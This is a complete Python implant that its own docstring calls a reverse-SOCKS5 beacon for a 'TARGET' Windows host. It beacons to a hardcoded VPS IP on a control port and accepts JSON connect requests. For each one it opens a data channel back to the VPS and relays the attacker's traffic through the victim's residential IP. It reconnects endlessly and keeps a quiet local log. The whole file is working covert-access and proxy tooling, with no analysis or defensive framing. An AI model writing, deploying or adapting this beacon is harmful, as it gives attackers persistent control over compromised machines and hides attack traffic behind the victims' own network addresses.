#!/usr/bin/env python3
"""Reverse-SOCKS5 beacon — runs on TARGET (Windows).
Connects out to VPS control channel; on request, opens a data connection
back to VPS, then egresses to the requested host:port via the residential IP."""
import socket, struct, threading, time, sys, json

def blog(m):
    try:
        with open(r"C:\Tools\sbc_log.txt", "a") as f:
            f.write(time.strftime("%H:%M:%S ") + str(m) + chr(10))
    except Exception:
        pass

VPS = "103.124.157.61"
CTRL_PORT = 53177   # control channel
DATA_PORT = 53178   # data connections

def pipe(a, b):
    try:
        while True:
            d = a.recv(65536)
            if not d:
                break
            b.sendall(d)
    except Exception:
        pass
    finally:
        try: a.close()
        except: pass
        try: b.close()
        except: pass

def handle_request(ctrl, req):
    """req: {'id': N, 'host': h, 'port': p}"""
    i = req["id"]
    blog("req id=%s %s:%s" % (i, req["host"], req["port"]))
    try:
        # open data channel to VPS
        data = socket.create_connection((VPS, DATA_PORT), timeout=15)
        data.sendall(struct.pack(">I", i))
        # egress to destination
        remote = socket.create_connection((req["host"], req["port"]), timeout=15)
        remote.settimeout(None)
        data.settimeout(None)
        blog("pipes up id=%s" % i)
        t1 = threading.Thread(target=pipe, args=(data, remote), daemon=True)
        t2 = threading.Thread(target=pipe, args=(remote, data), daemon=True)
        t1.start(); t2.start()
        ack = json.dumps({"op": "ok", "id": i}) + "\n"
    except Exception as e:
        blog("ERR id=%s %r" % (i, e))
        try:
            data.close()
        except Exception:
            pass
        ack = json.dumps({"op": "fail", "id": i, "err": str(e)}) + "\n"
    try:
        ctrl.sendall(ack.encode())
    except Exception:
        pass

import json
def ctrl_loop():
    while True:
        try:
            blog("connecting ctrl")
            ctrl = socket.create_connection((VPS, CTRL_PORT), timeout=20)
            ctrl.settimeout(None)
            ctrl.sendall(b"BEACON\n")
            buf = b""
            while True:
                d = ctrl.recv(4096)
                if not d:
                    break
                buf += d
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    if not line.strip():
                        continue
                    try:
                        req = json.loads(line)
                    except Exception:
                        continue
                    if req.get("op") == "connect":
                        threading.Thread(target=handle_request, args=(ctrl, req), daemon=True).start()
        except Exception:
            pass
        time.sleep(5)

if __name__ == "__main__":
    ctrl_loop()